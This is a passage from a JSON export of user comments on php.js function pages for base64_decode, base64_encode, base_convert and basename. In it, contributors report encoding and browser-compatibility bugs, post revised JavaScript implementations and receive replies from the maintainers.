a certain size, it fails with an 'out of memory' error."},{"date":"2008-05-08 21:57:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Aman Gupta: The array join tip has been implemented. As far as the atob goes, thanks for providing additional information. I think for now we should stick with a version that works everywhere until we find out exactly how to safely use the native functions among different mozilla versions."},{"date":"2009-02-20 14:35:26","author":"Pellentesque malesuada","url":"none","comment":"Found an error in base64_decode function. When function receives empty string, it returns 3 characters long string filled with something.\r\nThe solution is to replace do\/while method with simple while.\r\n\r\nfunction base64_decode( data ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Tyler Akins (http:\/\/rumkin.com)\r\n    \/\/ +   improved by: Thunder.m\r\n    \/\/ +      input by: Aman Gupta\r\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   bugfixed by: Onno Marsman\r\n    \/\/ -    depends on: utf8_decode\r\n    \/\/ *     example 1: base64_decode('S2V2aW4gdmFuIFpvbm5ldmVsZA==');\r\n    \/\/ *     returns 1: 'Kevin van Zonneveld'\r\n\r\n    \/\/ mozilla has this native\r\n    \/\/ - but breaks in 2.0.0.12!\r\n    \/\/if (typeof window['btoa'] == 'function') {\r\n    \/\/    return btoa(data);\r\n    \/\/}\r\n\r\n    var b64 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\/=&quot;;\r\n    var o1, o2, o3, h1, h2, h3, h4, bits, i = ac = 0, dec = &quot;&quot;, tmp_arr = [];\r\n\r\n    data += '';\r\n\r\n     while (i &lt; data.length) {  \/\/ unpack four hexets into three octets using index points in b64\r\n        h1 = b64.indexOf(data.charAt(i++));\r\n        h2 = b64.indexOf(data.charAt(i++));\r\n        h3 = b64.indexOf(data.charAt(i++));\r\n        h4 = b64.indexOf(data.charAt(i++));\r\n\r\n        bits = h1&lt;&lt;18 | h2&lt;&lt;12 | h3&lt;&lt;6 | h4;\r\n\r\n        o1 = bits&gt;&gt;16 &amp; 0xff;\r\n        o2 = bits&gt;&gt;8 &amp; 0xff;\r\n        o3 = bits &amp; 0xff;\r\n\r\n        if (h3 == 64) {\r\n            tmp_arr[ac++] = String.fromCharCode(o1);\r\n        } else if (h4 == 64) {\r\n            tmp_arr[ac++] = String.fromCharCode(o1, o2);\r\n        } else {\r\n            tmp_arr[ac++] = String.fromCharCode(o1, o2, o3);\r\n        }\r\n    }\r\n\r\n    dec = tmp_arr.join('');\r\n    dec = utf8_decode(dec);\r\n\r\n    return dec;\r\n}"},{"date":"2009-02-21 12:56:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@  Pellentesque malesuada: Thank you, I fixed it in svn, but I can't deploy at the moment. I think everything will be processed Monday!"},{"date":"2010-01-05 17:34:48","author":"zeroneta","url":"","comment":"[CODE]\n_.decode = function( a )\n{\n\treturn ( a + '' ).replace( \/[\\x80-\\xFF]{2,3}\/g, function( a )\n\t{\n\t\ta = [ a.charCodeAt(0), a.charCodeAt(1), a.charCodeAt(2) ];\n\t\treturn _.unicode( a[2] ? ( a[0] & 15 ) << 12 | ( a[1] & 63 ) << 6 | a[2] & 63 : ( a[0] & 31 ) << 6 | a[1] & 63 );\n\t} );\n},\n_.base64_decode = function( a )\n{\n\ta += '';\n\tfor ( var s = 0, d = a.length, f = '', r; s < d; r = [ base64.indexOf( a.charAt( s++ ) ), base64.indexOf( a.charAt( s++ ) ), base64.indexOf( a.charAt( s++ ) ), base64.indexOf( a.charAt( s++ ) ) ], r[4] = r[0] << 18 | r[1] << 12 | r[2] << 6 | r[3], f += r[2] == 64 ? _.unicode( r[4] >> 16 & 0xFF ) : r[3] == 64 ? _.unicode( r[4] >> 16 & 0xFF, r[4] >> 8 & 0xFF ) : _.unicode( r[4] >> 16 & 0xFF, r[4] >> 8 & 0xFF, r[4] & 0xFF ) );\n\treturn _.decode( f );\n},\n[\/CODE]"},{"date":"2010-01-05 17:38:48","author":"zeroneta","url":"","comment":"[CODE]\n_.unicode = _._.String.fromCharCode\n[\/CODE]"},{"date":"2010-12-11 20:21:39","author":"jamily","url":"http:\/\/www.bike-jersey.com","comment":"Thank you! very good!"},{"date":"2011-07-20 23:17:42","author":"Luke Scott","url":"","comment":"I don't know who added the \"dec = this.utf8_decode(dec);\" bit, but this is NOT correct. This line causes raw binary data to be mangled. Removing this line fixes the problem.\n\nBase64 does not, and should not, care about the charset. If you are expecting utf8 you can use utf8_decode yourself.\n\nPHP does not do this:\n\n[code]\n<?php\n$data = '';\n\nfor($i=0; $i < 100000; ++$i)\n{\n\t$data .= pack('V', rand(0, 999999999));\n}\n\nheader('Content-Type: text\/plain');\nprint strlen($data) . \"\\n\"; \/\/ ORIGONAL\nprint strlen( base64_decode(base64_encode($data)) ) . \"\\n\"; \/\/ GOOD\nprint strlen( utf8_decode( base64_decode(base64_encode($data)) ) )  . \"\\n\"; \/\/ WRONG!!\n?>\n[\/code]"},{"date":"2011-09-01 11:35:13","author":"Chris Buckley","url":"http:\/\/cmbuckley.co.uk","comment":"The (commented out) native Mozilla functions are the wrong way round: base64_decode === atob and base64_encode === btoa (as in, encoding = binary to ASCII)."},{"date":"2011-09-24 11:42:57","author":"Josep Sanz","url":"http:\/\/www.saltos.net","comment":"I'm using base64_decode to decode a binary PDF. I detect that the call to utf8_decode used at last of the function is causing problems when work directly with binary data.\n\nWhat is the reason of use this utf8_decode???\n\nI understand that play with base64_encode and base64_decode, must be as ping-pong and be independent of the contenst (UTF8 is assumed???)\n\nThe ping-pong refers to do for example base64_decode(base64_encode(BINARY_PDF_CONTENTS)) must return directly the BINARY_PDF_CONTENTS.\n\nThanks.\n\nJosep.\n"},{"date":"2011-10-13 13:55:29","author":"Yaffle","url":"http:\/\/hostel6.ru","comment":"Good implementation, but doesn't work for base64 strings without padding (\"==\" or \"=\")\r\n(From a theoretical point of view the padding character is not needed, since the number of missing bytes can be calculated from the number of Base64 digits, see http:\/\/en.wikipedia.org\/wiki\/Base64#Padding)\r\nand here is my implementation: https:\/\/gist.github.com\/1284012\r\n\r\nhttps:\/\/gist.github.com\/1284012"},{"date":"2011-12-13 21:25:46","author":"John Supplee","url":"","comment":"I agree with other posters that the utf8_decode in the function is a mistake and a departure from php behaviour.  I think the function should be modified to take a second boolean parameter for those who wish to invoke utf8 decoding.  The most proper way would be to leave the utf8 decoding out as a separate function.  However, there seems to be resistance to that.\n\n[CODE]\nfunction base64_decode (data, isUtf8) {\n. . .\n\tif (isUtf8)\n\t\tdec = this.utf8_decode(dec);\n[\/CODE]\n"},{"date":"2012-07-06 09:35:24","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@John Supplee, @Josep Sanz, @Luke Scott: The ut8_decode was removed in Git. We should indeed be following PHP and UTF8-friendly behavior.\n@Chris Buckley: Fixed comments in Git.\n@Yaffle: I see PHP also doesn't depend on the padding (though the MIME (RFC2045) per Wikipedia requires the padding), so I guess we should add support. I will see whether I have time later."}],"base64_encode":[{"date":"2008-01-04 18:01:14","author":"Bayron Guevara","url":"","comment":"I suggest the following code, because I think is faster:\r\n\r\nfunction base64_encode(data) {\r\n    \r\n    var b64 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\/=&quot;;\r\n    var o1, o2, o3, h1, h2, h3, h4, bits, i=0, enc='';\r\n        \r\n    do {  \/\/ pack three octets into four hexets\r\n        o1 = data.charCodeAt(i++);\r\n        o2 = data.charCodeAt(i++);\r\n        o3 = data.charCodeAt(i++);\r\n        \r\n        bits = o1&lt;&lt;16 | o2&lt;&lt;8 | o3;\r\n        \r\n        h1 = bits&gt;&gt;18 &amp; 0x3f;\r\n        h2 = bits&gt;&gt;12 &amp; 0x3f;\r\n        h3 = bits&gt;&gt;6 &amp; 0x3f;\r\n        h4 = bits &amp; 0x3f;\r\n              \r\n        \/\/ use hexets to index into b64, and append result to encoded string\r\n        enc += b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);\r\n    } while (i &lt; data.length);\r\n    \r\n\tswitch( data.length % 3 ){\r\n\t\tcase 1:\r\n\t\t\tenc = enc.slice(0, -2) + '==';\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tenc = enc.slice(0, -1) + '=';\r\n\t}\r\n\t\r\n\treturn enc;\r\n}"},{"date":"2008-01-04 20:27:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Bayron Guevara: Thank you I've updated the function and credited you in the comments! If you have thoughts on new functions as well, let me know!"},{"date":"2008-04-08 19:16:26","author":"TXGruppi","url":"","comment":"Reading the functions I found the base64_encode and base64_decode in a way very complicated.\r\n\r\nThere are the functions btoa and atob in JavaScript that make this conversion.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar name = 'JavaScript';\r\nvar enc = btoa(name);\r\nvar dec = atob(enc);\r\nalert(name); \/\/ JavaScript\r\nalert(enc); \/\/ SmF2YVNjcmlwdA==\r\nalert(dec); \/\/ JavaScript\r\n[\/CODE]\r\n\r\nAny questions send me an email: txgruppi@gmail.com\r\n\r\nTranslated by: Google Translator"},{"date":"2008-04-08 23:11:54","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ TXGruppi: Wow didn't know about that. Googling gave me the idea that this is mozilla only however. Can you confirm this? If so, we can always build in a browsercheck or a check on the existance of the btoa function and then decide which method to use"},{"date":"2008-04-09 18:54:28","author":"Howard Yeend","url":"","comment":"Confirmed btoa and atob working on:\r\n\r\n* Safaru 3.0.4 under windows\r\n* Firefox 2.0.0.13 under windows\r\n\r\nNot working in:\r\n\r\n* Any version of MSIE.\r\n\r\n\r\nInstead of using a UA check, why not do this:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nif(!function_exists(atob)) {\r\n function atob() {\r\n \/\/ funky b64 code here\r\n }\r\n}\r\n\r\nif(!function_exists(btoa)) {\r\n function btoa() {\r\n \/\/ funky b64 code here\r\n }\r\n}\r\n\r\n[\/CODE]"},{"date":"2008-04-09 18:55:45","author":"Howard Yeend","url":"","comment":"&quot;check on the existance of the btoa function and then decide which method to use&quot;\r\n\r\noops. just read that."},{"date":"2008-04-24 19:16:23","author":"Thunder.m","url":"","comment":"This function (base64_encode and decode) is not correct for utf strings.\r\nHere is working solution: http:\/\/www.webtoolkit.info\/javascript-base64.html"},{"date":"2008-04-25 10:57:48","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Thunder.m: Thanks, I've updated the code and added the utf dependency!"},{"date":"2008-04-25 11:04:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Howard Yeend &amp; TXGruppi: I've added a:\r\n[CODE=&quot;Javascript&quot;]\r\n    \/\/ mozilla has this native\r\n    if (typeof window['atob'] == 'function') {\r\n        return atob(data);\r\n    }\r\n[\/CODE]\r\nTo make use of mozilla's native base64 functions."},{"date":"2008-04-30 14:22:46","author":"Thunder.m","url":"","comment":"Hi, the mozilla atob function is not working well in my Firefox 2.0.0.12, there are some realy serious issues, so i think it shuld be removed, or tested more intensively."},{"date":"2008-05-02 11:42:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Thunder.m: Thank you for testing it in 2.0.0.12. It appears various versions handle atob() functions differently. Doing a browser version check isn't very reliable, so I guess I will fall back to the original function which works consistently in all JavaScript browsers. The fixed version will be visible shortly."},{"date":"2009-08-27 18:37:41","author":"Ulrich","url":"","comment":"I don't understand, why you are doing an utf8-encoding before encoding the data with base64. If we assume that our string \"data\" is just a byte array, it does not have any encoding. Base64 will work on a byte array and it shouldn't care about encoding. As far as I can see utf8-encoding is also destroying the data. If \\r gets replaced by \\n, for example, information is lost.\n\nPHP example (File encoding is UTF-8):\n[CODE]\n<?php\n\n$str1_1 = chr(0xc4); \/\/ iso 8859-1 \"\u00c4\"\n$str1_2 = \"\u00c4\";\n$str2 = \"\\n\";\n$str3 = \"\\r\";\n$str4 = \"\\r\\n\";\n\necho $str1_1, \"\\n\";\necho $str1_2, \"\\n\";\necho $str2, \"\\n\";\necho $str3, \"\\n\";\necho $str4, \"\\n\";\n\necho \"---\\n\";\n\necho base64_encode($str1_1), \"\\n\";\necho base64_encode($str1_2), \"\\n\";\necho base64_encode($str2), \"\\n\";\necho base64_encode($str3), \"\\n\";\necho base64_encode($str4), \"\\n\";\n\necho \"===\\n\";\n\necho utf8_encode($str1_1), \"\\n\";\necho utf8_encode($str1_2), \"\\n\";\necho utf8_encode($str2), \"\\n\";\necho utf8_encode($str3), \"\\n\";\necho utf8_encode($str4), \"\\n\";\n\necho \"---\\n\";\n\necho base64_encode(utf8_encode($str1_1)), \"\\n\";\necho base64_encode(utf8_encode($str1_2)), \"\\n\";\necho base64_encode(utf8_encode($str2)), \"\\n\";\necho base64_encode(utf8_encode($str3)), \"\\n\";\necho base64_encode(utf8_encode($str4)), \"\\n\";\n\n?>\n[\/CODE]\n\nRESULT:\n[CODE]\n$ php php_test.php\n\n\u00c4\n\n\n\n\n\n---\nxA==\nw4Q=\nCg==\nDQ==\nDQo=\n===\n\u00c4\n\u00c3\u0084\n\n\n\n\n\n---\nw4Q=\nw4PChA==\nCg==\nDQ==\nDQo=\n[\/CODE]\n\nOr does JavaScript handles strings in a different way?"},{"date":"2009-08-27 19:26:25","author":"Ulrich","url":"","comment":"Ok, I was a bit wrong with my previouse post...\nIt looks like if JavaScript is handling strings in a different way and not as byte arrays, so utf8_encode seems to be required. But I still wonder why \\r has to be replaced."},{"date":"2009-08-30 05:25:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ulrich: I assume the function creators were trying to just make it more convenient for themselves in handling newlines in a uniform way, but as you are correct that this is not the PHP way, and it should not be the job of this function to streamline newlines, I've applied your fix in SVN (i.e., removing the newline replaces)."},{"date":"2009-10-01 11:10:57","author":"noe","url":"http:\/\/noe.wen9.net\/","comment":"Thank's"},{"date":"2010-01-05 17:33:58","author":"zeroneta","url":"","comment":"_.encode = function( a )\n{\n\treturn ( a + '' ).replace( \/[^\\x00-\\xFF]\/g, function( a )\n\t{\n\t\ta = a.charCodeAt();\n\t\treturn a < 2048 ? _.unicode( a >> 6 | 192 ) + _.unicode( a & 63 | 128 ) : _.unicode( a >> 12 | 224 ) + _.unicode( a >> 6 & 63 | 128 ) + _.unicode( a & 63 | 128 );\n\t} );\n},\n_.base64_encode = function( a )\n{\n\ta = _.encode( a );\n\tfor ( var s = 0, d = a.length, f = '', r; s < d; r = a.charCodeAt( s++ ) << 16 | a.charCodeAt( s++ ) << 8 | a.charCodeAt( s++ ), f += base64.charAt( r >> 18 & 0x3F ) + base64.charAt( r >> 12 & 0x3F ) + base64.charAt( r >> 6 & 0x3F ) + base64.charAt( r & 0x3F ) );\n\treturn ( d %= 3 ) ? d > 1 ? f.slice( 0, -1 ) + '=' : f.slice( 0, -2 ) + '==' : f;\n},"},{"date":"2010-01-05 17:37:28","author":"zeroneta","url":"","comment":"[CODE]\n_.unicode = _._.String.fromCharCode\n[\/CODE]"},{"date":"2010-07-02 08:40:31","author":"weblink","url":"","comment":"I used phpjs functions serialize(), utf8-encode() and base64_encode(). This is my javascript code \n[CODE]\n var string = \"\u201e\u0153\u0153\u201e\u201aXSS[\u2026\u201e\u2013\u017d\u201e\u2022\"\n result=serialize(string);\n alert(base64_encode(result));\n[\/CODE]\n\nIf i use serialize & base64_encode in php functions in my php program, it is giving \"czoxNToihJychIJYU1NbhYSWjoSVIjs=\".\n\nBut, in the above code i am getting wrong output.\n\nCan anyone give suggestion for this problem that i need to get the same output like php.\n"},{"date":"2010-12-24 07:38:07","author":"justin","url":"","comment":"when the raw date is chinese,the base64_encode has diff result with the php base64_encode"},{"date":"2011-02-01 20:43:52","author":"Seingh","url":"patronum.tk","comment":"I did not understand much code written by you, in theory, should have a javascript function to base64.\nObviously I can be wrong;-)\nSorry for my English, I'm Italian."},{"date":"2011-07-19 21:46:11","author":"John","url":"http:\/\/www.jj5.net\/","comment":"The line,\n\n[CODE]\n    data = this.utf8_encode(data + '');\n[\/CODE]\n\nis incorrect. PHP treats input to base64_encode as a binary string. I had to comment out this code in order to get compatibility with existing PHP code that uses binary strings. I'd advise removing this line altogether, it doesn't make sense, especially as the input is likely already in UTF-8 encoding, and if it's not then it's probably a binary string (or some other encoding, in any event that line shouldn't be there)."},{"date":"2011-12-27 18:31:04","author":"John","url":"http:\/\/www.jj5.net\/","comment":"I fixed this function over at jsphp.co:\n\nhttp:\/\/jsphp.co\/jsphp\/fn\/diff\/base64_encode?a=389&b=460\n"},{"date":"2012-02-29 23:00:49","author":"austin","url":"","comment":"base64_encode mangles utf8 binary data this line:\n[code]\ndata = this.utf8_encode(data + '');\n[\/code]\nif the string is already utf8 it encodes it MORE and the resulting binary is unintelligible.\na fix i used for this is:\n[code]\nif(!isutf8)\n    {\n      data = this.utf8_encode(data + '');\n    }\n[\/code]\nand i pass isutf8 as a second argument, this changes it a bit from the original but gives the option to utf8 encode it first or not."},{"date":"2012-03-08 19:52:18","author":"Daniel Dotsenko","url":"www.walnutcomputing.com","comment":"Per my tests pre-splitting the string, with consequent use of array[index] lookup is 3 times faster on IE - the only browser you would use this on. (All others have btoa())\n\nIn addition to that, Closure Compiler for some reason \"optimizes\" the code above (long string with 4x .charAt look up in that string) into 4 fold repetition of that string within minified code. I know it's Closure's faulty \"optimization\" logic, but switching to array helps it do the right thing.\n\nHere is something that behaved about 3 times faster (on IE) than the code you have above (on long 20k+ texts) in our use:\n\n[CODE]\nfunction base64_encode(data) {\n    \/\/ use native implementation if it's present\n    if (typeof btoa === 'function') return btoa(data)\n\n    var b64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\/=\",\n        b64a = b64.split(''),\n        o1, o2, o3, h1, h2, h3, h4, bits, i = 0,\n        ac = 0,\n        enc = \"\",\n        tmp_arr = [];\n \n    do { \/\/ pack three octets into four hexets\n        o1 = data.charCodeAt(i++);\n        o2 = data.charCodeAt(i++);\n        o3 = data.charCodeAt(i++);\n \n        bits = o1 << 16 | o2 << 8 | o3;\n \n        h1 = bits >> 18 & 0x3f;\n        h2 = bits >> 12 & 0x3f;\n        h3 = bits >> 6 & 0x3f;\n        h4 = bits & 0x3f;\n \n        \/\/ use hexets to index into b64, and append result to encoded string\n        tmp_arr[ac++] = b64a[h1] + b64a[h2] + b64a[h3] + b64a[h4];\n    } while (i < data.length);\n\n    enc = tmp_arr.join('');\n    var r = data.length % 3;\n    return (r ? enc.slice(0, r - 3) : enc) + '==='.slice(r || 3);\n}\n[\/CODE]\n\n\ntest is here: \nhttp:\/\/jsperf.com\/base64-most-referred-mit-and-bsd-vs-native-btoa\/2"},{"date":"2012-04-23 14:46:56","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other   \n"}],"base_convert":[{"date":"2009-12-03 15:44:48","author":"asd","url":"","comment":"What's the \"+0\" and \"+''\" for? I assume you're type-casting, but would it ever make a difference?"},{"date":"2009-12-14 15:37:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ asd: You'd have to ask Philippe Baumann, but yes, +0 will make a difference and can prevent strange results when JavaScript automagically casts you an unexpected type : )"},{"date":"2010-04-22 23:27:15","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"I think, it would be better to handle arguments this way:\n\nfunction base_convert(number, frombase, tobase){\n   return parseInt(number + '', frombase | 0).toString(tobase | 0);\n}\n\nfrombase and tobase should be integers. When passing some other types, like float or a numeric string, PHP converts them to integer. The bitwise OR operator does more or less the same, converts the values to number and truncates the floating part of the number.\nIMO, the conversion of number arguments to string is not that important, but I left it in place."},{"date":"2010-04-23 11:12:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rafa\u0142 Kukawski: Looking good!\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/419ceb08a367a7f2fb564ff0dc4e2cbf2bbffe96"}],"basename":[{"date":"2008-01-07 11:28:58","author":"Ash Searle","url":"","comment":"I've fixed a couple of bugs in your current implementation: suffix should be optional, and basename should work for partial paths (e.g. basename(&quot;foo.txt&quot; &quot;.txt&quot;) should return &quot;foo&quot;)\r\n\r\n[CODE=\"Javascript\"]\r\nfunction basename(path, suffix) {\r\n    var b = path.replace(\/^.*[\/\\\\]\/g, '');\r\n    if (typeof(suffix) == 'string' &amp;&amp; b.substr(-suffix.length) == suffix) {\r\n        b = b.substr(0, b.length-suffix.length);\r\n    }\r\n    return b;\r\n}\r\n[\/CODE]"},{"date":"2008-01-07 11:39:33","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ash Searle: Good point, I've updated the function. Thanks for contributing!"},{"date":"2008-01-13 00:43:14","author":"Leslie Hoare","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction rand(min, max) {\r\n    if(max) {\r\n        return Math.floor(Math.random() * (max - min + 1)) + min;\r\n    } else {\r\n        return Math.floor(Math.random() * (min + 1));\r\n    }\r\n}\r\n[\/CODE]"},{"date":"2008-01-13 12:45:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Leslie Hoare: Added. Thanks a lot!"},{"date":"2008-01-15 05:03:27","author":"Lincoln Ramsay","url":"","comment":"The regular expression is not ECMAScript-262 compliant.\r\nIt should be:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar b = path.replace(\/^.*[\\\/\\\\]\/g, '');\r\n[\/CODE]\r\n\r\nECMAScript does not allow \/ to appear anywhere in a regular expression literal unless it is escaped by the \\ character."},{"date":"2008-01-15 08:15:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Lincoln Ramsay: Thank you so much! The function has been updated."},{"date":"2008-03-03 14:38:39","author":"djmix","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nb.substr(-suffix.length)\r\n[\/CODE] doesn't work in ie because him doesn't allow negative values as start index.\r\nTo solve that the solution is:\r\n\r\n[code=&quot;Javascript&quot;]b.substr(b.length-suffix.length)[\/CODE]\r\n\r\nFixed Function:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction basename(path, suffix) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   improved by: Ash Searle (http:\/\/hexmen.com\/blog\/)\r\n    \/\/ +   improved by: Lincoln Ramsay\r\n    \/\/ *     example 1: basename('\/www\/site\/home.htm', '.htm');\r\n    \/\/ *     returns 1: 'home'\r\n \r\n    var b = path.replace(\/^.*[\\\/\\\\]\/g, '');\r\n    if (typeof(suffix) == 'string' &amp;&amp; b.substr(-suffix.length) == suffix) {\r\n        b = b.substr(0, b.length-suffix.length);\r\n    }\r\n    return b;\r\n}[\/CODE]"},{"date":"2008-03-03 14:41:08","author":"djmix","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nb.substr(-suffix.length)[\/CODE]\r\ndoesn't work in ie because him doesn't allow negative values as start index. To solve that the solution is: [CODE=&quot;Javascript&quot;]\r\nb.substr(b.length-suffix.length)[\/CODE]\r\nFixed Function (Sorry, now yes): [CODE=&quot;Javascript&quot;]\r\nfunction basename(path, suffix) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   improved by: Ash Searle (http:\/\/hexmen.com\/blog\/)\r\n    \/\/ +   improved by: Lincoln Ramsay\r\n    \/\/ *     example 1: basename('\/www\/site\/home.htm', '.htm');\r\n    \/\/ *     returns 1: 'home'\r\n \r\n    var b = path.replace(\/^.*[\\\/\\\\]\/g, '');\r\n    if (typeof(suffix) == 'string' &amp;&amp; b.substr(b.length-suffix.length) == suffix) {\r\n        b = b.substr(0, b.length-suffix.length);\r\n    }\r\n    return b;\r\n}[\/CODE]"},{"date":"2008-03-03 17:02:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ djmix: Thanks a lot djmix!! Updated!"},{"date":"2009-01-05 00:11:10","author":"Nate","url":"","comment":"Hi.  I created a pathinfo() function.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction pathinfo(path, options)\r\n{\r\n\tvar re = \/(([^\\\\\/]*?)(?:\\.([^.]*))?)$\/;\r\n\tvar re2 = \/(.*)[\\\\\/]\/;\r\n\t\r\n\tvar path_arr = re.exec(path);\r\n\tvar dir_arr = re2.exec(path);\r\n\t\r\n\t\/\/ To be PHP compatible, no directory becomes &quot;.&quot;\r\n\tif (dir_arr == null || dir_arr == &quot;&quot;) dir_arr = [&quot;&quot;,&quot;.&quot;];\r\n\t\r\n\tvar path_obj = {dirname:dir_arr[1],basename:path_arr[0],extension:path_arr[3],filename:path_arr[2]};\r\n\t\r\n\tif (typeof options == &quot;undefined&quot;) {\r\n\t\tif (path_obj.extension == &quot;&quot; &amp;&amp; path_obj.filename.slice(-1) != &quot;.&quot;) {\r\n\t\t\t\/\/ To be PHP compatible, if there is no dot (.) in the name, the extension value is not set.\r\n\t\t\tdelete path_obj.extension;\r\n\t\t}\r\n\t\treturn path_obj;\r\n\t} else {\r\n\t\tswitch (options) {\r\n\t\t\tcase &quot;PATHINFO_DIRNAME&quot;: return path_obj.dirname;\r\n\t\t\tcase &quot;PATHINFO_BASENAME&quot;: return path_obj.basename;\r\n\t\t\tcase &quot;PATHINFO_EXTENSION&quot;: return path_obj.extension;\r\n\t\t\tcase &quot;PATHINFO_FILENAME&quot;: return path_obj.filename;\r\n\t\t}\r\n\t}\r\n}\r\n[\/CODE]\r\n\r\nexample 1: pathinfo(&quot;\/www\/htdocs\/index.html&quot;);\r\nreturns 1: {dirname:&quot;\/www\/htdocs&quot;,basename:&quot;index.html&quot;,extension:&quot;html&quot;,filename:&quot;index&quot;}"},{"date":"2009-01-06 16:34:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nate: Thanks a lot Nate! I did struggle to get the regexes to work though (syntax issues). I finally felt like taking a completely different approach (I hope you don't mind man), and by means of an experiment, I took a look at the original php5 C code and tried to recreate it from there.\r\nOf course I kept the credit for your original intact!"},{"date":"2009-07-18 09:05:41","author":"Albert Martin","url":"http:\/\/www.albertmartin.de","comment":"I needed also to remove the extension, no matter what filetype it is. So if you set suffix==true, it removes any, not the one specified:\n[CODE]\nfunction basename(path, suffix) {\n    \/\/...\n    var b = path.replace(\/^.*[\\\/\\\\]\/g, '');\n    if (typeof(suffix) == 'string' && b.substr(b.length-suffix.length) == suffix) {\n        b = b.substr(0, b.length-suffix.length);\n    } else if (suffix == true && b.indexOf('.') != -1) {\n\t\tb = b.substr(0, b.lastIndexOf('.'));\n\t}\n    return b;\n}\n[\/CODE]"},{"date":"2009-07-19 01:46:27","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Albert Martin, Thanks for offering. Although we only intend to use functions in the library which adhere to PHP behavior (unless it seems to warrant a configuration which can be changed with ini_set()), you might consider adding your function to http:\/\/phpjs.org\/wiki . Kevin, it looks like by your removing the specific license, Mediawiki has defaulted to GNU Free Documentation License for the wiki. Do you recall if there was a way to configure it otherwise?"},{"date":"2009-07-24 12:04:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: I manually changed the license now. It's the same as PHP.JS'. Will this license work for content as well as code you think?"},{"date":"2009-07-29 03:14:56","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kevin: Sweet! Thanks for handling that! Yes, I think it should work just fine for content... Btw, while there's no harm in it, we don't strictly need to \"dual license\" since the MIT license is compatible with GPL (though not vice versa)--you can just use MIT and it will work for GPL users, though I guess maybe it avoids GPL users having to copy-and-paste the MIT clause info..."},{"date":"2009-09-21 00:33:52","author":"Pedro","url":"","comment":"Hello there.\n\nI would like to report that basename should stripdown what's in front of the ?. By applying basename to a url like this:\necra.php?p=1\n\nIt should return \"ecra.php\" only.\nI've tested the following way:\n\n[CODE]\nvar path = window.location.href;\nconsole.log(basename(path)); \n[\/CODE]\n\nPlease note:\nWith window.location.pathname this issue does not apply."},{"date":"2009-10-08 14:43:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Pedro: Actually, this is expected behavior. If you try this in PHP it will also return ecra.php?p=1\n\nThis may not make a whole lot of sense from the browser point-of-view; but we also have to consider other JavaScript platforms like V8, rhino, and stuff built on that like node.js\n\nThis is the one of the reasons we chose to always stick with PHP's implementation. At least developers know what to expect; and in theory you should be able to run PHP code in PHP.JS without worrying about different implementations & stuff blowing up in your face.\n\nSo I'm sorry to say Pedro, you're going to have to parse this like you'd otherwise have to in PHP as well."},{"date":"2011-07-26 19:02:02","author":"Dj","url":"","comment":"Note that when the input ends with one or more slashes, PHP ignores them and returns the word before them.\n'\/\/\/b\/\/\/' result is 'b'\n'\/\/\/\\\\\/\/' result is '' (an empty string)\n\nTo return values like PHP the code should be:\n[CODE]\nfunction basename(path, suffix) {\n    var str = (path + '').replace(\/^[\\\/\\\\]+$\/, '').replace(\/^.*[\\\/\\\\]([^\\\/\\\\]+)[\\\/\\\\]?\/g, '$1');\n    if (typeof suffix === 'string' && str.substr(str.length - suffix.length) === suffix) {\n    \treturn str.substr(0, str.length - suffix.length);\n    }\n    return 